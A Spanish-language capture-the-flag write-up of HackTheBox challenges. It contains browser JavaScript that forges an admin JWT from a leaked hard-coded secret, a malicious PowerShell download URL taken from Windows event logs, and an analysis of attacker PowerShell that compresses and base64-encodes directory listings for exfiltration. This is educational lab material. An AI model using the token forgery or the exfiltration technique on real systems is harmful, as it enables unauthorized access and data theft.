# WEB

## WayWitch

Nos da simplemente una pagina que envia tickets, pense que seria xss o algo pero nel:
![Página de tickets](/images/events/Images/Pasted%20image%2020241024122624.png)

revise los scripts de la pagina y al parecer hay un script que crea el jwt y lo hace son la secret key en el mismo script.
descifrando la cookie dice user:ghesst_11133
que no nos interesa lo cambiamos a admin con la aydua de la consoal de comandos:

``` script
async function generateAdminJWT() {
    const header = {
        alg: "HS256",
        typ: "JWT",
    };

    const payload = {
        username: "admin",
        role: "admin",  // <- Aquí establecemos el rol de admin
        iat: Math.floor(Date.now() / 1000),
    };

    const secretKey = await crypto.subtle.importKey(
        "raw",
        new TextEncoder().encode("halloween-secret"),
        { name: "HMAC", hash: "SHA-256" },
        false,
        ["sign"],
    );

    const headerBase64 = btoa(JSON.stringify(header))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");
    const payloadBase64 = btoa(JSON.stringify(payload))
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");

    const dataToSign = `${headerBase64}.${payloadBase64}`;
    const signatureArrayBuffer = await crypto.subtle.sign(
        { name: "HMAC" },
        secretKey,
        new TextEncoder().encode(dataToSign),
    );

    const signatureBase64 = btoa(
        String.fromCharCode.apply(
            null,
            new Uint8Array(signatureArrayBuffer),
        ),
    )
        .replace(/\+/g, "-")
        .replace(/\//g, "_")
        .replace(/=+$/, "");

    const token = `${dataToSign}.${signatureBase64}`;

    document.cookie = `session_token=${token}; path=/; max-age=${60 * 60 * 24}; Secure`;

    console.log("Generated admin JWT token:", token);
}

generateAdminJWT();
```


ahora nos crea la cookie y ya etsa con admin:
![Cookie de admin](/images/events/Images/Pasted%20image%2020241024122859.png)

Bien ahora viendo el codigo que nos proporcionaron del controlador de rutas, hay una linea interesante hay una ruta llamda tickets, que solo se accede si tu cookie es admin, y como la cambiamos realizamos la request:
![Request de tickets](/images/events/Images/Pasted%20image%2020241024123032.png)

Y nos da la request completa de todos los tickets:

![Respuesta completa](/images/events/Images/Pasted%20image%2020241024123053.png)
y en el de admin en la descripcion esta la flag.

HTB{k33p_jwt_s3cr3t_s4f3_br0_c8374ad1057858d2b4a47b53d5180932}
 tambien lo probe con burpxd:
![Prueba con Burp](/images/events/Images/Pasted%20image%2020241024123303.png)


# Forensics

## Ghostly Persistence

Nos dan un monton de logs de windows evtx

Hay un monton pero casi todos siguen un patron todos tienen el mismo tamaño a exepcion de unarchivo que es el mas pesado, probablemente ahi este la flag.

![Logs de Windows](/images/events/Images/Pasted%20image%2020241024183730.png)


Estos logs solo se pueden abrir con el gestor de eventro scon windwos o eso pense
busque una herramienta 

llamada evtx_dump que te dumpea todo en json

![Herramienta evtx_dump](/images/events/Images/Pasted%20image%2020241024183626.png)

Despues procedi a dumpear con la herramienta y parsearlo a json en un txt

![Dump a JSON](/images/events/Images/Pasted%20image%2020241024183824.png)
analizando el txt me doy cuenta de que casi al prinicpio en el  Record 5 hay un encoded:

Encontre el primer pedazo de la flag en un EventData:
 es un base64
 
![Primer pedazo base64](/images/events/Images/Pasted%20image%2020241024183319.png)

![Decodificación](/images/events/Images/Pasted%20image%2020241024183405.png)


Buscando tiempo despues encontre otro base64 en el eventData del record 46:

![Segundo base64](/images/events/Images/Pasted%20image%2020241024183208.png)

y finalmente encontre el otro pedazo:

![Tercer pedazo](/images/events/Images/Pasted%20image%2020241024183239.png)

la flag seria:

HTB{Gh0st_L0c4t10n_W4s_R3v34l3d}

JAJAJA HAY UN RICKROLL EN UNA PARTE DONDE SE REALIZA LA DESCARGA DE UN ARCHIVO
![Rickroll](/images/events/Images/Pasted%20image%2020241024184703.png)
 JAJAJA ES ESTE LINK XDDDDDDDDDD

http://windowsliveupdater.com/3MZvgfcEiT.ps1/

## Foggy Intrusion

Analisis de una captura de Wiresharkxd

Vale analizamos el  primer stream
no hay nada solo not found
el segundo tampoco
en el tercero se pone buena la cosa, ya que se envia el siguente dato en base64
![Datos en base64](/images/events/Images/Pasted%20image%2020241024192133.png)
Si lo decodeamos nos dice lo siguente:
![Decodificación del comando](/images/events/Images/Pasted%20image%2020241024192208.png)
Analizando el codigo:
1. **`Get-ChildItem -Path C:\xampp`**:
    
    - Este comando obtiene una lista de todos los archivos y directorios en el directorio `C:\xampp`. Es equivalente a un `ls` en Linux o `dir` en la línea de comandos de Windows.
2. **`$output = Get-ChildItem -Path C:\xampp`**:
    
    - Asigna el resultado del listado de archivos y carpetas en `C:\xampp` a la variable `$output`.
3. **`$bytes = [Text.Encoding]::UTF8.GetBytes($output)`**:
    
    - Convierte la salida de la lista de archivos (almacenada en `$output`) en una secuencia de bytes en formato UTF-8. Esto es necesario porque la compresión funciona sobre datos binarios.
4. **`$compressedStream = [System.IO.MemoryStream]::new()`**:
    
    - Crea un **stream (flujo)** en memoria para almacenar los datos comprimidos.
5. **`$compressor = [System.IO.Compression.DeflateStream]::new($compressedStream, [System.IO.Compression.CompressionMode]::Compress)`**:
    
    - Inicia un objeto de compresión usando el algoritmo **Deflate**, que comprime los datos. Los datos comprimidos se guardan en el stream de memoria `$compressedStream`.
6. **`$compressor.Write($bytes, 0, $bytes.Length)`**:
    
    - Comprime los datos (`$bytes`) y los escribe en el stream de compresión (`$compressor`).
7. **`$compressor.Close()`**:
    
    - Cierra el objeto compresor para asegurar que se han escrito y comprimido correctamente todos los datos.
8. **`$compressedBytes = $compressedStream.ToArray()`**:
    
    - Convierte el contenido del stream de memoria comprimido en un array de bytes.
9. **`[Convert]::ToBase64String($compressedBytes)`**:
    
    - Finalmente, los bytes comprimidos se convierten a una cadena de texto en Base64, lo que permite transferirlos de manera segura y legible como texto.


vale ahora que hacemos con esta informacion?
En cada POST hay una respuesta del servidor pero esta pasada por todo lo que esta alli, es decir:

- **Convertir de Base64 a bytes**: Primero se decodifica la cadena Base64.
- **Descomprimir**: Luego, se utiliza el mismo algoritmo **Deflate** para descomprimir los bytes.
- **Convertir de bytes a texto**: Finalmente, se convierte los bytes descomprimidos de nuevo a una cadena de texto legible en UTF-8.

Que hacemos??
Nos crafteamos en python un codigo para hacer esto 

```python

import base64
import zlib
# Cadena Base64 comprimida que deseas descomprimir

compressed_base64_data = "<cadena_Base64_comprimida_aqui>"
# 1. Decodificar de Base64 a bytes
compressed_bytes = base64.b64decode(compressed_base64_data)
# 2. Descomprimir los datos usando zlib con -zlib.MAX_WBITS para modo RAW (Deflate)
decompressed_bytes = zlib.decompress(compressed_bytes, -zlib.MAX_WBITS)
# 3. Convertir de bytes a cadena UTF-8
decoded_text = decompressed_bytes.decode('utf-8')
# Imprimir el resultado
print(decoded_text)

```

Ahora probamos con cada respuesta:
La primera nos da como entro al sistema
La segunda como lsito los directorios:
Y en la tercera como define sus configuraciones para sus bases de datos y pone como contraseña de su base de datos:

![Flag encontrada](/images/events/Images/Pasted%20image%2020241024192037.png)

HTB{f06_d154pp34r3d_4nd_fl46_w4s_f0und!}

seria la flag y un pwn a la base de datos uwu

# Reversing

## LinkHands

VALE HICE TRAMPAAAAA
LE HICE UN HEXDUMPPPPPPPPPPPP
QUEMENMEEEE
PERO NECESITO HACERLO RAPIDOOOOOOOOOOOOOO
![Hexdump](/images/events/Images/Pasted%20image%2020241024203350.png)

ORDENANDO SALE:

_ch41n_0e343f537ebcHTB{4_br34k_1n_th3

ORDENANDO MAS:

HTB{4_br34k_1n_th3_ch41n_0e343f537ebc}

jeje

## Terrorfryer



![Terrorfryer](/images/events/Images/Pasted%20image%2020241025113922.png)